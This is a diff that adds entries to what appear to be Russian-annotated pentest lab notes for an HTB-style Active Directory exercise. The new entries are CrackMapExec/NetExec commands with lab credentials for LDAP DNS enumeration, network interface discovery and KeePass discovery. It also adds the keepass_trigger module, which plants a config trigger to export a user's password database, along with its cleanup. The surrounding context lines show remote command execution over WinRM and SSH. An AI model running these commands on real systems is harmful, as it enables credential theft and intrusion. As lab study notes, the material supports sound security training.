@@ -214,6 +214,23 @@
 	nxc smb winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable'
 	# Command Execution with SSH Using a Private Key
 	nxc ssh 10.129.204.133 -u julio --key-file id_ed25519 -p "" -x whoami
+
+	# Получение записей с DNS сервера
+	crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
+
+	# число сетевых интерфейсов на машинах
+	crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections
+	crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver
+
+	# keepass_discover 
+	crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover
+
+	# Выполнение команды keeppass_trigger ALL одним действием. 
+	nxc smb 10.129.204.177 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:\\Users\\david\\AppData\\Roaming\	\KeePass\\KeePass.config.xml     (необходимо ждать пока пользователь войдет в кипасс)
+
+	# Очистка изменений в конфигурационном файле
+	crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
+
 	
 # clock sync
 
